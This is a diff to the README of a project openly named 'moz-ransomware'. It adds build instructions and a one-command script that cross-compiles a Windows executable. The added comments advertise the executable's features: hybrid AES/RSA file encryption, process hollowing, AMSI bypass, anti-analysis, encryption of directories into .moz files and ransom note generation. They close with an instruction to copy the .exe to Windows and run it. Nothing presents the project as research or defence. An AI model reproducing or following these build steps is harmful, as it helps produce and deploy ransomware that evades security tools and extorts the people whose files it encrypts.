@@ -76,23 +76,39 @@ Integration & Workflow (Phase 4):
 
 How to Build
 ------------
-# Native Linux build:
+# Native Linux build (C++ shared library + test executables):
     cd /home/runner/moz-ransomware/core
     rm -rf build && mkdir build && cd build
     cmake ..
     make
     # Produces: libmoz_core.so, moz_test, moz_evasion_test
 
-# Cross-compile for Windows (from Linux):
-    cd /home/runner/moz-ransomware/core
-    rm -rf build && mkdir build && cd build
-    CMAKE_SYSTEM_NAME=Windows cmake -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc -DCMAKE_CXX_COMPILER=x86_64-w64-mingw32-g++ ..
-    make
-    # Produces: libmoz_core.dll, moz_test.exe, moz_evasion_test.exe
-
 # Python wrapper (no build required):
     cd /home/runner/moz-ransomware/wrapper/src
     python3 moz_main.py --help
+
+# Cross-compile Windows .exe from Linux (one-command script):
+    # Requires MinGW-w64 cross-compilers: x86_64-w64-mingw32-gcc and x86_64-w64-mingw32-g++
+    # Install: sudo apt-get install mingw-w64-x86_64-toolchain
+    #
+    # Usage: ./build-winexe.sh [output_name]
+    #   Output: <name>.exe in core/build/
+    #   Example: ./build-winexe.sh moz-ransomware
+    #
+    # The produced .exe contains all functionality:
+    # - Hybrid AES-256-GCM + RSA-2048 encryption
+    # - Process hollowing, AMSI bypass, anti-analysis
+    # - Directory encryption with .moz file output
+    # - Ransom note generation
+    #
+    # Copy the .exe to Windows and run it
+    ./build-winexe.sh
+
+# Or manual CMake command (if not using the script):
+    CMAKE_SYSTEM_NAME=Windows cmake -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc \
+        -DCMAKE_CXX_COMPILER=x86_64-w64-mingw32-g++ ..
+    make
+    # Produces: *.exe and *.dll in core/build/
 
 How to Test
 -----------
